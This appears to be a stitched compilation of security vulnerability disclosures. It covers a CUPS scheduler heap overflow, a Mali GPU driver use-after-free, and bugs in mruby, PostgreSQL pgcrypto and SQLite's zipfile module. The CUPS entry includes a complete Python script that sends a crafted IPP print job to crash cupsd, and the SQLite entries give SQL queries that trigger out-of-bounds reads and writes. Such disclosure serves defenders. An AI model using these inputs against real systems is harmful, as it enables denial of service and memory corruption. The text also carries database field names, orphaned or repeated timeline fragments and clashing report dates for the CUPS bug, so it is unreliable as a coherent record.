---

Reported: 2026-02-18
Acknowledged: 2026-02-18

Vulnerability has been disclosed as [GHSA-6qxf-7jx6-86fh](https://github.com/OpenPrinting/cups/security/advisories/GHSA-6qxf-7jx6-86fh)

## Summary

There is a heap-based buffer overflow in the CUPS scheduler when building filter option strings from job attributes.

## Details

Note file references are accurate for the latest release version v2.4.16, this bug is also present on main at time of writing.

The size calculation for the options string uses ipp_length which excludes URI attributes, but serialization still writes selected URI attributes (job-uuid, job-authorization-uri).
This allows an attacker who can submit IPP jobs to trigger memory corruption in cupsd by creating malicious large job-uuid or job-authorization-uri attributes.

The root cause in get_options/ipp_length:

In get_options the allocation size for the constructed option string comes from ipp_length(job->attrs) at scheduler/job.c:3912.
ipp_length unconditionally skips URI attributes at scheduler/job.c:4191 and scheduler/job.c:4193.
get_options still permits URI attributes job-uuid and job-authorization-uri (filter exception) at scheduler/job.c:3977 and scheduler/job.c:3995.
URI values are then serialized in the IPP_TAG_URI case with direct writes (*optptr++ = ...) at scheduler/job.c:4118 and scheduler/job.c:4123, without a bounds check, resulting in a potential out of bounds write if the calculated length in ipp_length was insufficient.

## PoC

Following python script constructs a IPP request that triggers this overflow and sends it to a cups server, causing a segfault.

```python
#!/usr/bin/env python3
import argparse
import http.client
import random
import socket
import struct


IPP_VERSION_MAJOR = 2
IPP_VERSION_MINOR = 0
IPP_OP_PRINT_JOB = 0x0002

IPP_TAG_OPERATION = 0x01
IPP_TAG_JOB = 0x02
IPP_TAG_END = 0x03

IPP_TAG_URI = 0x45
IPP_TAG_NAME = 0x42
IPP_TAG_CHARSET = 0x47
IPP_TAG_LANGUAGE = 0x48
IPP_TAG_MIMETYPE = 0x49


def add_attr(buf: bytearray, value_tag: int, name: str, value: str) -> None:
    name_bytes = name.encode("utf-8")
    value_bytes = value.encode("utf-8")
    if len(name_bytes) > 0xFFFF or len(value_bytes) > 0xFFFF:
        raise ValueError(f"attribute too large: {name}")

    buf.append(value_tag)
    buf.extend(struct.pack(">H", len(name_bytes)))
    buf.extend(name_bytes)
    buf.extend(struct.pack(">H", len(value_bytes)))
    buf.extend(value_bytes)


def make_uri(prefix: str, target_len: int) -> str:
    if target_len <= len(prefix):
        return prefix + "A"
    return prefix + ("A" * (target_len - len(prefix)))


def build_ipp_request(host: str, port: int, printer: str, uuid_len: int, auth_len: int, request_id: int) -> bytes:
    printer_uri = f"ipp://{host}:{port}/printers/{printer}"
    job_uuid = make_uri("ipp://u/", uuid_len)
    job_auth_uri = make_uri("ipp://a/", auth_len)

    msg = bytearray()
    msg.extend(struct.pack(">BBHI", IPP_VERSION_MAJOR, IPP_VERSION_MINOR, IPP_OP_PRINT_JOB, request_id))

    msg.append(IPP_TAG_OPERATION)
    add_attr(msg, IPP_TAG_CHARSET, "attributes-charset", "utf-8")
    add_attr(msg, IPP_TAG_LANGUAGE, "attributes-natural-language", "en")
    add_attr(msg, IPP_TAG_URI, "printer-uri", printer_uri)
    add_attr(msg, IPP_TAG_NAME, "requesting-user-name", "attacker")
    add_attr(msg, IPP_TAG_MIMETYPE, "document-format", "application/postscript")

    msg.append(IPP_TAG_JOB)
    add_attr(msg, IPP_TAG_URI, "job-uuid", job_uuid)
    add_attr(msg, IPP_TAG_URI, "job-authorization-uri", job_auth_uri)

    msg.append(IPP_TAG_END)

    document = b"%!PS-Adobe-3.0\n%%Pages: 1\n%%EOF\n"
    return bytes(msg) + document


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Send crafted IPP Print-Job request to trigger URI undercount overflow path.")
    parser.add_argument("--host", default="127.0.0.1", help="CUPS host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8631, help="CUPS port (default: 8631)")
    parser.add_argument("--printer", default="Test1", help="Printer name (default: Test1)")
    parser.add_argument("--uuid-len", type=int, default=12000, help="Length of job-uuid URI value (default: 12000)")
    parser.add_argument("--auth-len", type=int, default=12000, help="Length of job-authorization-uri URI value (default: 12000)")
    parser.add_argument("--request-id", type=int, default=None, help="IPP request-id (default: random)")
    parser.add_argument("--timeout", type=float, default=5.0, help="HTTP timeout in seconds (default: 5.0)")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    request_id = args.request_id if args.request_id is not None else random.randint(1, 2**31 - 1)

    payload = build_ipp_request(args.host, args.port, args.printer, args.uuid_len, args.auth_len, request_id)
    resource = f"/printers/{args.printer}"
    headers = {
        "Content-Type": "application/ipp",
        "Content-Length": str(len(payload)),
        "Connection": "close",
    }

    print(f"[*] Sending crafted Print-Job to ipp://{args.host}:{args.port}{resource}")
    print(f"[*] job-uuid length={args.uuid_len}, job-authorization-uri length={args.auth_len}, payload={len(payload)} bytes")

    try:
        conn = http.client.HTTPConnection(args.host, args.port, timeout=args.timeout)
        conn.request("POST", resource, body=payload, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        print(f"[*] HTTP status: {resp.status} {resp.reason}, response bytes: {len(body)}")
        conn.close()
        return 0
    except (ConnectionError, socket.error, OSError) as exc:
        print(f"[!] Connection failed (expected if cupsd crashed): {exc}")
        return 0


if __name__ == "__main__":
    main()
```

## Impact
Heap-based buffer overflow in cupsd triggerable by any attacker that can submit print jobs.
Crash/DoS is straightforward; memory corruption may be exploitable for code execution.

## Timeline 

Reported: 2026-02-12
Acknowledged: 2026-02-13
Fixed: 2026-03-31
CVE-2026-34979
Upstream fix

items.title_raw: [MEDIUM] UAF in Android mali GPU driver
items.title_display: UAF in Android mali GPU driver
items.body_markdown:
## Location

`kbase_kcpu_cqs_set_process` in `kernel/google-modules/gpu/mali_kbase/csf/mali_kbase_csf_kcpu.c`

## Description

The function dereferences the pointer “evt” after releasing its underlying kernel mapping via kbase_phy_alloc_mapping_put(). Specifically, after writing to evt and calling put (line 923), it evaluates KBASE_KTRACE_ADD_CSF_KCPU(...) with evt[BASEP_EVENT32_ERR_OFFSET/sizeof(u32)] (lines 925-926). The KTRACE macro captures its argument by value (mali_kbase_debug_ktrace_csf.h:186), so the dereference occurs post-put. If put() drops the last references, kbase_mem_kref_free() tears down the permanent mapping (mali_kbase_mem.c:1766-1769), and kbase_phy_alloc_mapping_term() unmaps/frees the mapping (mali_kbase_mem_linux.c:229-234), making “evt” invalid. This yields a use-after-free read and likely kernel page fault.


## Trigger Conditions

- An unprivileged app creates a Mali kbase GPU context and a KCPU command queue, and allocates a CQS sync object (backed by a kbase_mem_phy_alloc with permanent_map) to obtain its GPU address.
- It enqueues a BASE_KCPU_COMMAND_TYPE_CQS_SET referencing that address so the kernel will call kbase_phy_alloc_mapping_get(), write to evt, and then kbase_phy_alloc_mapping_put().
- Concurrently, the app frees/unmaps the underlying CQS allocation/region before the kernel reaches the KTRACE line, so the put() drops the final krefs and invokes kbase_mem_kref_free() which calls kbase_phy_alloc_mapping_term() to unmap the permanent_map.
- Immediately after put(), KBASE_KTRACE_ADD_CSF_KCPU dereferences evt to fetch the error value, causing a UAF read that can fault and crash the kernel.

The race is feasible on SMP since the userspace free can happen between the kernel’s get and the KTRACE dereference.


## Impact analysis

This can be driven by an unprivileged app through interaction with /dev/mali0 on Pixel devices.
At minimum, this vulnerability yields an unprivileged local DoS.
It also has potential for information disclosure via ktrace, but this requires root.


## Crash log
```

[  277.542731][ T9089]   FSC = 0x07: level 3 translation fault
[  277.542736][ T9089] Data abort info:

...
```

A negative size memcpy in mruby io_gets could allow denial of service via attacker controlled calls to gets.

More details available at https://github.com/mruby/mruby/issues/6646

Vulnerability Details:

More details available at https://github.com/mruby/mruby/issues/6647

---

Reported: 2025-10-20
Fixed: 2025-10-22
[Upstream Fix](https://github.com/makesoftwaresafe/mruby/commit/01ab2ffc29a1f2d67b2e88ec674c5288d5b97aa4)

Fixed: 2025-10-22

---

Reported: 2025-10-20
Fixed: 2025-10-21
[Upstream Fix](https://github.com/makesoftwaresafe/mruby/commit/a3797173c2c526a0a40e35ca5a75eb476cac4cb8)

Reported: 2025-10-20
Fixed: 2025-10-22
[CVE-2025-12875](https://nvd.nist.gov/vuln/detail/CVE-2025-12875)
[Upstream Fix](https://github.com/makesoftwaresafe/mruby/commit/93619f06dd378db6766666b30c08978311c7ec94)

Vulnerability Details:

More details available at https://github.com/mruby/mruby/issues/6649

---

Reported: 2025-10-20
Fixed: 2025-10-27
[CVE-2025-13120](https://nvd.nist.gov/vuln/detail/CVE-2025-13120)
[Upstream Fix](https://github.com/makesoftwaresafe/mruby/commit/eb398971bfb43c38db3e04528b68ac9a7ce509bc)

**Location:** `contrib/pgcrypto/pgp-pubdec.c:226:229` in function `pgp_parse_pubenc_sesskey`


### Description

The function copies the decrypted session key into a fixed-size buffer without bounding the copy length. After unpadding the PKCS#1 v1.5 block, it sets `ctx->sess_key_len = msglen - 3` and does `memcpy(ctx->sess_key, msg + 1, ctx->sess_key_len)` (`contrib/pgcrypto/pgp-pubdec.c:227-229`). However, `ctx->sess_key` is only `PGP_MAX_KEY` (32) bytes long (`contrib/pgcrypto/pgp.h:171-172`, `contrib/pgcrypto/pgp.h:112`). Since `msglen` is derived from the RSA/ElGamal plaintext length and `control_cksum()` imposes no upper bound (`contrib/pgcrypto/pgp-pubdec.c:80-93`), an attacker can supply a crafted ciphertext and matching key to make `ctx->sess_key_len` much larger than 32, causing an out-of-bounds write.

### Code Context

```
	ctx->cipher_algo = *msg;
	ctx->sess_key_len = msglen - 3;
	memcpy(ctx->sess_key, msg + 1, ctx->sess_key_len);

```

---

items.title_raw: [MEDIUM] Heap out-of-bounds read in SQLite zipfileGetEntry
items.title_display: Heap out-of-bounds read in SQLite zipfileGetEntry
items.body_markdown:
Vulnerability Details:

A heap out-of-bounds read in SQLite's zipfileGetEntry could allow leaking of sensitive heap data including pointers when attackers can perform SQL queries with the zipfile module enabled (as is default on many platforms).  

The memcpy in sqlite3/ext/misc/zipfile.c : zipfileGetEntry copies pNew->cds.szCompressed bytes from &aBlob[pNew->iDataOff] without checking that iDataOff + szCompressed ≤ nBlob, enabling an out-of-bounds read.

Example trigger:
```
SELECT * FROM zipfile(X'504b03041400000000000000000000000000100000001000000001000100414243434343504b010214001400000000000000000000000000ffff0000ffff000001000000000000000000000000000000000041504b050600000000010001002f000000240000000000');
```

---

Reported: 2025-08-04
Fixed: 2025-08-04
[Upstream Fix](https://sqlite.org/src/vinfo/642e89191deaf75d?diff=2&proof=858002589)

Vulnerability Details:

A heap out of bounds write in SQLite's zipfileAppendEntry could allow code execution when attackers can perform SQL queries with the zip module enabled (as is default on many platforms).

The call to zipfileSerializeLFH in zipfileAppendEntry writes pCds->nFile bytes of zFile into a fixed-size (ZIPFILE_BUFFER_SIZE=64K) buffer at offset 30 without checking that nFile <= (64K−30). A sufficiently long file name causes a heap buffer overflow.

Example trigger:
```
CREATE VIRTUAL TABLE t USING zipfile('out.zip');
INSERT INTO t(name,mode,mtime,sz,rawdata,data,method) VALUES(printf('%.*c', 65520, 'A'), NULL,0,NULL,NULL,X'00',NULL);
```

---

Reported: 2025-08-04
Fixed: 2025-08-04
[Upstream Fix](https://sqlite.org/src/vinfo/642e89191deaf75d?diff=2&proof=858002589)
